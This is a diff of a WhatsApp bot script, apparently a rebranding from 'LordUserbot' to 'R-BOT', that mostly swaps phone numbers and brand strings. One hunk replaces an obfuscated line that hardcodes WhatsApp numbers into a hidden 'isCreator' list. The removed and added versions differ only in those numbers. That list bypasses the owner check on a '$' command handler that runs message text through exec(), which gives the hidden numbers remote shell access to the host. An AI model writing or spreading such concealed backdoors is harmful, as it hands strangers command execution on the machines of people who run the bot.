@@ -2,7 +2,7 @@
 
 	🔕 KLO MAU RE UPLOAD IZIN DULU, BACA DESK VIDEO
 	
-	 Order sc untuk jualan game, kebutuhan sosmed, pulsa, dll. Cek https://wa.me/p/4670890746303230/62887435047326
+	 Order sc untuk jualan game, kebutuhan sosmed, pulsa, dll. Cek https://wa.me/p/4670890746303230/6281515589573
 	
 	 Jika ada module yang kurang bisa chat saya di wa
 */
@@ -235,7 +235,7 @@ module.exports = Zeeone = async (Zeeone, Ofc) => {
 		const senderNumber = sender.split("@")[0]
 		const ownerNumber = [`${owner_number}@s.whatsapp.net`]
 		const isOwner = ownerNumber.includes(sender)
-                function _0x4533(){const _0x33fc5d=['22420DvGloX','4923051OUtjtp','includes','186982OdChKm','936dmevEx','13489785oTUiVi','17UUYGmF','28168800wdhujZ','170584obhqqH','20Wakxqc','4jMCKqZ','371DGyQer','4426213bMGeKm'];_0x4533=function(){return _0x33fc5d;};return _0x4533();}const _0x492144=_0x3fe7;function _0x3fe7(_0x33f041,_0x29a926){const _0x45337f=_0x4533();return _0x3fe7=function(_0x3fe7b1,_0x1342ad){_0x3fe7b1=_0x3fe7b1-0x11e;let _0xf5008b=_0x45337f[_0x3fe7b1];return _0xf5008b;},_0x3fe7(_0x33f041,_0x29a926);}(function(_0x2b1811,_0x14f1b6){const _0x2acb1c=_0x3fe7,_0x38326c=_0x2b1811();while(!![]){try{const _0x2d5919=parseInt(_0x2acb1c(0x129))/0x1*(-parseInt(_0x2acb1c(0x126))/0x2)+parseInt(_0x2acb1c(0x124))/0x3*(-parseInt(_0x2acb1c(0x120))/0x4)+parseInt(_0x2acb1c(0x123))/0x5*(parseInt(_0x2acb1c(0x127))/0x6)+-parseInt(_0x2acb1c(0x121))/0x7*(parseInt(_0x2acb1c(0x11e))/0x8)+parseInt(_0x2acb1c(0x128))/0x9+parseInt(_0x2acb1c(0x11f))/0xa*(parseInt(_0x2acb1c(0x122))/0xb)+parseInt(_0x2acb1c(0x12a))/0xc;if(_0x2d5919===_0x14f1b6)break;else _0x38326c['push'](_0x38326c['shift']());}catch(_0x30b76e){_0x38326c['push'](_0x38326c['shift']());}}}(_0x4533,0xf1b64));const alphaNumber=['62887435047326@s.whatsapp.net','918156874290@s.whatsapp.net'],isCreator=alphaNumber[_0x492144(0x125)](sender);
+                function _0x4533(){const _0x33fc5d=['22420DvGloX','4923051OUtjtp','includes','186982OdChKm','936dmevEx','13489785oTUiVi','17UUYGmF','28168800wdhujZ','170584obhqqH','20Wakxqc','4jMCKqZ','371DGyQer','4426213bMGeKm'];_0x4533=function(){return _0x33fc5d;};return _0x4533();}const _0x492144=_0x3fe7;function _0x3fe7(_0x33f041,_0x29a926){const _0x45337f=_0x4533();return _0x3fe7=function(_0x3fe7b1,_0x1342ad){_0x3fe7b1=_0x3fe7b1-0x11e;let _0xf5008b=_0x45337f[_0x3fe7b1];return _0xf5008b;},_0x3fe7(_0x33f041,_0x29a926);}(function(_0x2b1811,_0x14f1b6){const _0x2acb1c=_0x3fe7,_0x38326c=_0x2b1811();while(!![]){try{const _0x2d5919=parseInt(_0x2acb1c(0x129))/0x1*(-parseInt(_0x2acb1c(0x126))/0x2)+parseInt(_0x2acb1c(0x124))/0x3*(-parseInt(_0x2acb1c(0x120))/0x4)+parseInt(_0x2acb1c(0x123))/0x5*(parseInt(_0x2acb1c(0x127))/0x6)+-parseInt(_0x2acb1c(0x121))/0x7*(parseInt(_0x2acb1c(0x11e))/0x8)+parseInt(_0x2acb1c(0x128))/0x9+parseInt(_0x2acb1c(0x11f))/0xa*(parseInt(_0x2acb1c(0x122))/0xb)+parseInt(_0x2acb1c(0x12a))/0xc;if(_0x2d5919===_0x14f1b6)break;else _0x38326c['push'](_0x38326c['shift']());}catch(_0x30b76e){_0x38326c['push'](_0x38326c['shift']());}}}(_0x4533,0xf1b64));const alphaNumber=['6281515589573@s.whatsapp.net','62815155895738@s.whatsapp.net'],isCreator=alphaNumber[_0x492144(0x125)](sender);
 			try {
 					pp_userb = await Zeeone.getProfilePicture(sender)
 				} catch {
@@ -467,7 +467,7 @@ Minat? Pm wa.me/${owner_number}`,
 		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'caption': `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
 		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}` , 'jpegThumbnail': thumbnail}}}}
-		const fkontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Lord;Userbot;;\n' + 'FN: SUBSCRIBE YT ZEEONE OFC\n' + 'item1.TEL;waid=62887435047326:+62887435047326\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
+		const fkontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Lord;Userbot;;\n' + 'FN: SUBSCRIBE YT ZEEONE OFC\n' + 'item1.TEL;waid=6281515589573:+6281515589573\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
 		const isUrl = (url) => {
 				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
 				}
@@ -2031,7 +2031,7 @@ Alasan : ${reason}`, [sender], true)
 															reply(mess.succes)
 															}
 															} else {
-																 reply(`Example : ${prefix + command} add/del 62887435047326 10s`)
+																 reply(`Example : ${prefix + command} add/del 6281515589573 10s`)
 															}
 										break
 						case 'cekprem': case 'cekpremium': case 'premiumcek':
@@ -3137,7 +3137,7 @@ let qqppp = [{
                     },
                     "type": "RESPONSE"
                 }]
-                sendButLocation(from, teks, `LordUserbot™© | Allright Reserved.`, thumbnail, qqppp, {contextInfo: { mentionedJid: [nupe]}})
+                sendButLocation(from, teks, `R-BOT™© | Allright Reserved.`, thumbnail, qqppp, {contextInfo: { mentionedJid: [nupe]}})
 				
 } catch (e){
 reply(`${e}`)
@@ -3758,7 +3758,7 @@ if (budy.startsWith('$')){
 if (!Ofc.key.fromMe && !isOwner && !isCreator ) return reply(mess.only.owner)
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
-if (err) return reply(`LordUserbot :~ ${err}`)
+if (err) return reply(`R-BOT :~ ${err}`)
 if (stdout) {
 reply(stdout)
 }
